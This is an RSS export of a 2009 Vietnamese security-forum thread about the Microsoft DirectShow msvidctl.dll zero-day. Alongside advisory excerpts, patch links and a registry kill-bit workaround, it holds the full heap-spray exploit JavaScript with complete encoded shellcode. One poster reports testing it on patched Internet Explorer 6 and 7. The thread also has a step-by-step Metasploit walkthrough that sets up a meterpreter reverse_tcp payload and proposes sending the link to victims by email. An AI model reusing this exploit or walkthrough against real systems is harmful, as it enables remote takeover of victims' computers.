<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "0-day in Microsoft DirectShow"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "0-day in Microsoft DirectShow"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ Theo <span class="link"> http://isc.sans.org/diary.html?storyid=6733&rss</span> cảnh báo, msvidctl.dll được sử dụng để làm bàn đạp để tấn công. Theo đánh giá của trang <span class="link"> http://www.csis.dk/dk/nyheder/nyheder.asp?tekstID=799</span> (trang nguyên thủy disclose thông tin này) thì exploit này cho phép kiểm soát máy của nạn nhân từ xa.

Sans cho biết:
<blockquote>A 0-day exploit within the msVidCtl component of Microsoft DirectShow is actively being exploited through drive-by attacks using thousands of newly compromised web sites, according to CSIS. The code has been published in the public domain via a number of Chinese web sites.&nbsp;
		</blockquote>

(Theo CSIS, một 0-day exploit được tìm thấy trong msvidctl.dll của DirectShow đang được khai thác xuyên qua phương tiện sử dụng hàng ngàn web site đã bị khống chế gần đây. code exploit đã được công bố rộng rãi xuyên qua một số trang web của Trung Quốc).


Đoạn code exploit được csis công bố:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>var appllaa='0';
var nndx='%'+'u9'+'0'+'9'+'0'+'%u'+'9'+'0'+'9'+appllaa;
var dashell=unescape&#40;nndx+"%u03eb%ueb59%ue805
%ufff8%uffff%u4937%u4949%u4949%u4949%u4949" +
" + &#91;SNIP&#93; &#40;đoạn shell code hoàn chỉnh đã được tháo bỏ vì lý do bảo mật&#41;.

var headersize=20;
var omybro=unescape&#40;nndx&#41;;
var slackspace=headersize+dashell.length;
while&#40;omybro.length&lt;slackspace&#41;
omybro+=omybro;
bZmybr=omybro.substring&#40;0,slackspace&#41;;
shuishiMVP=omybro.substring&#40;0,omybro.length-slackspace&#41;;
while&#40;shuishiMVP.length+slackspace&lt;0x30000&#41;
shuishiMVP=sh uishiMVP+sh uishiMVP+bZmybr; memory=new Array&#40;&#41;;
for&#40;x=0;x&lt;300;x++&#41;
memory&#91;x&#93;=shuishiMVP+dashell;
var myObject=document.createElement&#40;'object'&#41;;
DivID.appendChild&#40;myObject&#41;;
myObject.width='1';
myObject.height='1';
myObject.data='./logo.gif';
myObject.classid='clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';</pre>
		</div>

Trước mắt, CSIS đưa ra biện pháp "work around":
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>A valid work around for the attack vector is available which set's the kill bit on the vulnerable DLL.

Windows Registry Editor Version 5.00
&#91;HKEY_LOCAL_MACHINESOFTWAREMicrosoftInternet ExplorerActiveX Compatibility{0955AC62-BF2E-4CBA-A2B9-A63F772D46CF}&#93;
"Compatibility Flags"=dword:00000400</pre>
		</div>

Cho đến nay, Microsoft vẫn chưa công bố bản vá nhưng họ đang làm việc khẩn cấp để fix lổ hổng này. Đây là Advisory chính thức của MS:<span class="link"> http://www.microsoft.com/technet/security/advisory/972890.mspx</span>

Thông tin này cũng được thông báo rộng rãi trên một số nhật báo ở Úc:<span class="link"> http://www.theage.com.au/technology/security/security-hole-microsoft-issues-rare-warning-20090707-dapa.html</span> và<span class="link"> http://www.smh.com.au/technology/security/security-hole-microsoft-issues-rare-warning-20090707-dapa.html</span>)

Cách tốt nhất hiện nay: <b>không dùng Internet Explorer</b>.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#185648</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#185648</link>
				<pubDate><![CDATA[Tue, 7 Jul 2009 09:08:32]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ http://go.microsoft.com/?linkid=9672398 đã có bản fix tại đây]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#185667</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#185667</link>
				<pubDate><![CDATA[Tue, 7 Jul 2009 11:53:55]]> GMT</pubDate>
				<author><![CDATA[ vikjava]]></author>
			</item>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ Lỗi này là IE 0-day exploit. Chỉ có tác dụng với IE vì nó thuộc về ActiveX của DirectShow, bác nào sử dụng Firefox thì vẫn an toàn không cần update. Cái nội dung file reg được công bố trên sans để disable ActiveX bị sai format:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>Windows Registry Editor Version 5.00
&#91;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{0955AC62-BF2E-4CBA-A2B9-A63F772D46CF}&#93;
"Compatibility Flags"=dword:00000400</pre>
		</div>
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#185711</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#185711</link>
				<pubDate><![CDATA[Tue, 7 Jul 2009 17:17:53]]> GMT</pubDate>
				<author><![CDATA[ LeVuHoang]]></author>
			</item>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ đây là đoạn sh3llode hoàn chỉnh 

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>var appllaa='0';

var nndx='%'+'u9'+'0'+'9'+'0'+'%u'+'9'+'0'+'9'+appllaa;

var dashell=unescape&#40;nndx+"%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +

                          "%u4948%u4949%u4949%u4949%u4949%u4949%u5a51%u436a" +

                          "%u3058%u3142%u4250%u6b41%u4142%u4253%u4232%u3241" +

                          "%u4141%u4130%u5841%u3850%u4242%u4875%u6b69%u4d4c" +

                          "%u6338%u7574%u3350%u6730%u4c70%u734b%u5775%u6e4c" +

                          "%u636b%u454c%u6355%u3348%u5831%u6c6f%u704b%u774f" +

                          "%u6e68%u736b%u716f%u6530%u6a51%u724b%u4e69%u366b" +

                          "%u4e54%u456b%u4a51%u464e%u6b51%u4f70%u4c69%u6e6c" +

                          "%u5964%u7350%u5344%u5837%u7a41%u546a%u334d%u7831" +

                          "%u4842%u7a6b%u7754%u524b%u6674%u3444%u6244%u5955" +

                          "%u6e75%u416b%u364f%u4544%u6a51%u534b%u4c56%u464b" +

                          "%u726c%u4c6b%u534b%u376f%u636c%u6a31%u4e4b%u756b" +

                          "%u6c4c%u544b%u4841%u4d6b%u5159%u514c%u3434%u4a44" +

                          "%u3063%u6f31%u6230%u4e44%u716b%u5450%u4b70%u6b35" +

                          "%u5070%u4678%u6c6c%u634b%u4470%u4c4c%u444b%u3530" +

                          "%u6e4c%u6c4d%u614b%u5578%u6a58%u644b%u4e49%u6b6b" +

                          "%u6c30%u5770%u5770%u4770%u4c70%u704b%u4768%u714c" +

                          "%u444f%u6b71%u3346%u6650%u4f36%u4c79%u6e38%u4f63" +

                          "%u7130%u306b%u4150%u5878%u6c70%u534a%u5134%u334f" +

                          "%u4e58%u3978%u6d6e%u465a%u616e%u4b47%u694f%u6377" +

                          "%u4553%u336a%u726c%u3057%u5069%u626e%u7044%u736f" +

                          "%u4147%u4163%u504c%u4273%u3159%u5063%u6574%u7035" +

                          "%u546d%u6573%u3362%u306c%u4163%u7071%u536c%u6653" +

                          "%u314e%u7475%u7038%u7765%u4370"&#41;;



var headersize=20;

var omybro=unescape&#40;nndx&#41;;

var slackspace=headersize+dashell.length;

while&#40;omybro.length&lt;slackspace&#41;

omybro+=omybro;

bZmybr=omybro.substring&#40;0,slackspace&#41;;

shuishiMVP=omybro.substring&#40;0,omybro.length-slackspace&#41;;

while&#40;shuishiMVP.length+slackspace&lt;0x30000&#41;

shuishiMVP=shuishiMVP+shuishiMVP+bZmybr; memory=new Array&#40;&#41;;

for&#40;x=0;x&lt;300;x++&#41;

memory&#91;x&#93;=shuishiMVP+dashell;

var myObject=document.createElement&#40;'object'&#41;;

DivID.appendChild&#40;myObject&#41;;

myObject.width='1';

myObject.height='1';

myObject.data='./logo.gif';

myObject.classid='clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';</pre>
		</div>




Thử nghiệm thành công trên nền tảng sau đây (đầy đủ patched 06/07/09):

- Trình duyệt Internet Explorer 6, Windows XP SP2
- Trình duyệt Internet Explorer 7, Windows XP SP3 

đây là đoạn 2 đoạn Ruby script được xây dựng để kích hoạt lỗi:
<span class="link"> http://www.rec-sec.com/exploits/msf/msvidctl_mpeg2.rb</span>
<span class="link"> http://www.rec-sec.com/code/msvidctl_gif.rb</span>

download ruby :<span class="link"> http://www.ruby-lang.org/en/</span>

update bản metasploit mới nhất về để hack


ai dùng linux thì vào thư mục của metasploit rồi gõ lệnh : svn update ,để update những gì mới nhất trong kho của metasploit


hường dẫn sử dụng metasploit: 

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>http://thegioimang.org/forum/tham-nhap-trong-microsoft/1515-tam-quan-trong-cua-update-metasploit-attack.html</pre>
		</div>

]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#185808</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#185808</link>
				<pubDate><![CDATA[Wed, 8 Jul 2009 19:03:34]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ hướng dẫn khai thác 0-day in Microsoft DirectShow với metasploit:

em bắt đầu bằng cách chạy msfconsole sau khi Metasploit đã cập nhật phiên bản mới nhất:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>holiganvn@root:~/svn/msf3-dev$ sudo ./msfconsole 

&#91;sudo&#93; password for holiganvn: 

                |                    |      _&#41; |   

 __ `__ \   _ \ __|  _` |  __| __ \  |  _ \  | __| 

 |   |   |  __/ |   &#40;   |\__ \ |   | | &#40;   | | |   

_|  _|  _|\___|\__|\__,_|____/ .__/ _|\___/ _|\__| 

                              _|                   

       =&#91; msf v3.3-dev

+ -- --=&#91; 384 exploits - 261 payloads

+ -- --=&#91; 20 encoders - 7 nops

       =&#91; 166 aux

msf &gt;</pre>
		</div>

	
em nạp mô-đun khai thác:


<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>msf &gt; use exploit/windows/browser/msvidctl_mpeg2 

msf exploit&#40;msvidctl_mpeg2&#41; &gt; set PAYLOAD windows/meterpreter/reverse_tcp 

PAYLOAD =&gt; windows/meterpreter/reverse_tcp

msf exploit&#40;msvidctl_mpeg2&#41; &gt; show options

Module options:

   Name     Current Setting  Required  Description                                          

   ----     ---------------  --------  -----------                                          

   SRVHOST  0.0.0.0          yes       The local host to listen on.                         

   SRVPORT  8080             yes       The local port to listen on.                         

   SSL      false            no        Use SSL                                              

   URIPATH                   no        The URI to use for this exploit &#40;default is random&#41;  

Payload options &#40;windows/meterpreter/reverse_tcp&#41;:

   Name      Current Setting  Required  Description                           

   ----      ---------------  --------  -----------                           

   EXITFUNC  process          yes       Exit technique: seh, thread, process  

   LHOST                      yes       The local address                     

   LPORT     4444             yes       The local port                        

Exploit target:

   Id  Name                                        

   --  ----                                        

   0   Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0</pre>
		</div>

	
em thiết  lập các biến Payload và Khai thác mô-đun:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>msf exploit&#40;msvidctl_mpeg2&#41; &gt; set SRVPORT 80

SRVPORT =&gt; 80

msf exploit&#40;msvidctl_mpeg2&#41; &gt; set LHOST 192.168.1.158

LHOST =&gt; 192.168.1.158

msf exploit&#40;msvidctl_mpeg2&#41; &gt; set URIPATH secure.html

URIPATH =&gt; secure.html

msf exploit&#40;msvidctl_mpeg2&#41; &gt; exploit

&#91;*&#93; Exploit running as background job.

msf exploit&#40;msvidctl_mpeg2&#41; &gt; 

&#91;*&#93; Handler binding to LHOST 0.0.0.0

&#91;*&#93; Started reverse handler

&#91;*&#93; Using url:<span class="link"> http://0.0.0.0:80/secure.html</span>

&#91;*&#93;  Local IP:<span class="link"> http://192.168.1.158:80/secure.html</span>

&#91;*&#93; Server started.</pre>
		</div>

	
Bây giờ chúng ta có thể khai thác bug ở một tệp HTML với GIF để khai thác một mục tiêu. Bạn có thể gửi các liên kết đến một mục tiêu người sử dụng trong một thư điện tử hoặc thông qua bất cứ phương pháp khác và một khi người dùng nhấn vào liên kết và mở Internet Explorer,như vậy chúng ta đã có thể khai thác vào máy của victim:

link test:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>http://fb.coru.in/0msvidctl.zip</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#186208</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#186208</link>
				<pubDate><![CDATA[Mon, 13 Jul 2009 19:06:42]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ up :
13mb FULL framework: <span class="link"> https://metasploit.com/framework-3.3-dev.exe</span>
5mb MINI (just msfconsole): <span class="link"> https://metasploit.com/mini-3.3-dev.exe</span>
<span class="link"> http://metasploit.com/svn/framework3/trunk/</span>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#186244</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#186244</link>
				<pubDate><![CDATA[Tue, 14 Jul 2009 13:18:04]]> GMT</pubDate>
				<author><![CDATA[ Bướm Đêm]]></author>
			</item>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ trong *nix thì các bác dùng lệnh dưới để cập nhật cho metasploit :

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>svn update</pre>
		</div>


]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#186292</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#186292</link>
				<pubDate><![CDATA[Tue, 14 Jul 2009 18:43:52]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ bản vá lỗi tại đây http://go.microsoft.com/?linkid=9672398 
Thiết lập kill bit trong registry để ngăn chặn Internet Explorer tiếp xúc với thành phần COM nguy hiểm tại đây
http://blog.bkis.com/wp-content/uploads/2009/07/killbitdirectshow.reg    #:S #:S  
Theo bkis.
 ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#186298</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#186298</link>
				<pubDate><![CDATA[Tue, 14 Jul 2009 20:06:45]]> GMT</pubDate>
				<author><![CDATA[ winwinwin]]></author>
			</item>
			<item>
				<title>0-day in Microsoft DirectShow</title>
				<description><![CDATA[ Metasploit 3.3-dev for win32:

<span class="link"> http://www.hvaonline.net/hvaonline/posts/list/29873.html#184276</span>


bản  metasploit v3.3 cho linux:

<span class="link"> http://www.telesphoreo.org/browser/trunk/data/metasploit3/framework-3.3.tar.gz</span>


]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30115.html#189848</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30115.html#189848</link>
				<pubDate><![CDATA[Thu, 13 Aug 2009 05:23:30]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
	</channel>
</rss>
